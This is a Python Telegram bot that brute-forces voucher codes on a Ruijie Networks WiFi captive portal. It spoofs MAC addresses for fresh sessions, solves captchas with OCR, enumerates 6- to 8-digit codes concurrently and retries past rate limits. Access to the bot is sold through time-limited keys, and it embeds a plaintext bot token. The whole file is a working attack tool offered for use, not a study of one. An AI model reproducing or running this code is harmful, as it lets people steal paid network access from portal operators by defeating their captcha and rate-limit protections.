import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ==========================================
# Bot Configuration
# ==========================================
BOT_TOKEN = "8920875247:AAHowI29h7xFaDbyk9bCWXvsxIYhrk9CdVw"
ADMIN_ID = "1901101365"

# GitHub Configuration (Render Environment Variables)
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")
GITHUB_REPO = os.environ.get("GITHUB_REPO")

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
session = None
_connector = None
CONCURRENCY = 50 
_voucher_sem = None
_start_time = time.monotonic()

# ==========================================
# GitHub Storage Integration
# ==========================================
async def get_file_content(path):
    if not GITHUB_TOKEN or not GITHUB_REPO:
        print("GitHub config missing")
        return {}, None
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get(url, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    content = base64.b64decode(data['content']).decode('utf-8')
                    return json.loads(content), data['sha']
                return {}, None
    except: return {}, None

async def update_file_content(path, content, sha, message):
    if not GITHUB_TOKEN or not GITHUB_REPO: return "No Config"
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
    payload = {
        "message": message,
        "content": base64.b64encode(json.dumps(content, indent=4, ensure_ascii=False).encode('utf-8')).decode('utf-8')
    }
    if sha: payload["sha"] = sha
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.put(url, headers=headers, json=payload) as resp:
                return "saved" if resp.status in [200, 201] else "failed"
    except: return "error"

# ==========================================
# Web Server for Render
# ==========================================
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ==========================================
# Original Bot Handlers
# ==========================================

@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /key ဖြင့်စတင်ပါ။")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve
    key = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    if key == ADMIN_ID or key in auth_list:
        valid = True if key == ADMIN_ID else check_key_expiration(auth_list[key])
        if valid:
            approve[message.chat.id] = True
            user_data[message.chat.id] = {}
            await bot.reply_to(message, " ✅ Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။")
        else:
            approve[message.chat.id] = False
            await bot.reply_to(message, " ❌ Key Expired ဖြစ်နေပါသည်။")
    else:
        await bot.reply_to(message, " ⚠️ သင်၏ key ကို registered မလုပ်ရသေးပါ။")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID: return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            expires_str = "Unlimited" if isinstance(data, dict) and data.get("expires_at") == "9999-12-31T23:59:59Z" else str(data)
            lines.append(f"👤 {uid} | {expires_str}")
        await bot.reply_to(message, "\n".join(lines)[:4096])
    except Exception as e: print(f"Error: {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 2: return
    user_id = args[1]
    auth_list, sha = await get_file_content("auth_list.json")
    if user_id in auth_list:
        del auth_list[user_id]
        await update_file_content("auth_list.json", auth_list, sha, f"Delete key {user_id}")
        await bot.reply_to(message, f" ✅ Deleted {user_id}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 3: return
    plan, user_id = args[1], args[2]
    expiry = generate_expiry(plan)
    if not expiry: return
    auth_list, sha = await get_file_content("auth_list.json")
    auth_list[user_id] = {"expires_at": expiry, "plan": plan}
    await update_file_content("auth_list.json", auth_list, sha, f"Add key {user_id}")
    await bot.reply_to(message, f" ✅ Generated\nID: {user_id}\nExpires: {expiry}")

@bot.message_handler(commands=['result'])
async def handle_result(message):
    results, _ = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
        await bot.reply_to(message, f"✅ Found Codes:\n" + "\n".join(results[chat_id_str]))
    else: await bot.reply_to(message, "မရှိသေးပါ။")

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z": return True
            return datetime.now(timezone.utc) < datetime.fromisoformat(expiry.replace("Z", "+00:00"))
        return False
    except: return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {"30m": 30, "1h": 60, "1d": 1440, "7d": 10080, "1m": 43200, "1y": 525600}
    if plan == "unlimited": return "9999-12-31T23:59:59Z"
    return (now + timedelta(minutes=plans.get(plan, 0))).isoformat() if plan in plans else None

# ==========================================
# SUPER ROBUST Session URL Check (Fix for Render)
# ==========================================
async def check_session_url(session_url):
    # Rule 1: If URL already has sessionId, it is 100% CORRECT.
    if "sessionId=" in session_url:
        return True
    
    # Rule 2: If it contains Ruijie keywords, assume it's valid for Render
    if "ruijienetworks.com" in session_url or "portal" in session_url:
        # We try to fetch just to be sure, but if it fails, we still return True
        try:
            async with session.get(session_url, allow_redirects=True, ssl=False, timeout=10) as resp:
                if "sessionId" in str(resp.url) or resp.status == 200:
                    return True
        except:
            # Render IP might be blocked, but the URL is likely correct
            return True
    return False

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /input your_session_url")
        return
    url = args[1]
    if message.chat.id in approve:
        await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
        if await check_session_url(url):
            user_data[message.chat.id]['session_url'] = url
            await bot.reply_to(message, "✅ Session URL သိမ်းပြီးပါပြီ။ /scan စတင်ပါ။")
        else: await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return
    mode, chat_id = args[1], message.chat.id
    if not approve.get(chat_id, False) or 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "⚠️ /key နှင့် /input အရင်လုပ်ပါ။")
        return
    progress_msg = await bot.send_message(chat_id, "🔍Scanning Codes...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message, progress_msg))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    if message.chat.id in scan_tasks:
        scan_tasks[message.chat.id]["stop"] = True
        await bot.reply_to(message, "🛑 /scan ကို ရပ်တန့်ပြီးပါပြီ။")

async def github_update_scheduler():
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty(): items.append(await SUCCESS_CODE.get())
        if items:
            results, sha = await get_file_content("result.json")
            for item in items:
                uid, code = str(item["chat_id"]), item["code"]
                if uid not in results: results[uid] = []
                if code not in results[uid]: results[uid].append(code)
            await update_file_content("result.json", results, sha, "Periodic Update")

# ==========================================
# Original Bruteforce Logic (Restored)
# ==========================================

def get_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))

async def get_session_id(session, session_url, previous_session_id=None):
    url = re.sub(r'(?<=mac=)[^&]+', get_mac(), session_url)
    try:
        async with session.get(url, allow_redirects=True, ssl=False, timeout=15) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else previous_session_id
    except: return previous_session_id

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    for _attempt in range(3):
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as task_session:
            sid = await get_session_id(task_session, session_url, None)
            if not sid: continue
            auth_code = None
            for _ in range(8):
                try:
                    img_req = await task_session.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sid}&_t={time.time()}', ssl=False)
                    img_bytes = await img_req.read()
                    text = await asyncio.to_thread(lambda: _ocr.classification(img_bytes).upper())
                    v = await task_session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json={'sessionId': sid, 'authCode': text}, ssl=False)
                    v_data = await v.json()
                    if v_data.get("success"):
                        auth_code = text
                        break
                except: continue
            if not auth_code: continue
            data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth_code}
            headers = {
                "content-type": "application/json",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={sid}",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers, ssl=False) as req:
                    resp = await req.text()
                    if 'logonUrl' in resp:
                        if not recheck:
                            if chat_id not in success_texts: success_texts[chat_id] = []
                            success_texts[chat_id].append(code)
                            await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
                            await bot.send_message(chat_id, f"✅ Success Code Found: {code}")
                        return code
                    if 'request limited' in resp:
                        await asyncio.sleep(2)
                        continue
                    return None
            except: pass
    if not recheck: retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
    return None

async def run_bruteforce(mode, chat_id, session_url, scan_id, message, progress_msg):
    def iter_codes(m):
        if m in ["6", "7"]:
            c = [str(i).zfill(int(m)) for i in range(10 ** int(m))]
            random.shuffle(c)
            yield from c
        else:
            while True: yield "".join(random.choice(string.digits) for _ in range(8))
    code_iter = iter_codes(mode)
    checked, start = 0, time.monotonic()
    global _voucher_sem
    if _voucher_sem is None: _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    try:
        while not scan_tasks.get(chat_id, {}).get("stop"):
            batch = [next(code_iter) for _ in range(15)]
            await asyncio.gather(*[perform_check(session_url, c, chat_id, scan_id, message=message) for c in batch], return_exceptions=True)
            checked += len(batch)
            if checked % 30 == 0:
                elapsed = time.monotonic() - start
                speed = (checked / elapsed * 60) if elapsed > 0 else 0
                text = f"🔍Scanning Codes...\n\n📦Checked : {checked:,}\n⚡Speed : {speed:,.0f} codes/min\n✅Found : {len(success_texts.get(chat_id, []))}\n🔁Retry : {retry_counts.get(chat_id, 0)}"
                try: await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
                except: pass
    finally: scan_tasks.pop(chat_id, None)

_ocr = ddddocr.DdddOcr(show_ad=False)

async def main():
    global _connector, session
    _connector = aiohttp.TCPConnector(limit=100, ssl=False)
    session = aiohttp.ClientSession(connector=_connector)
    asyncio.create_task(web_server())
    asyncio.create_task(github_update_scheduler())
    await bot.infinity_polling()

if __name__ == '__main__':
    asyncio.run(main())
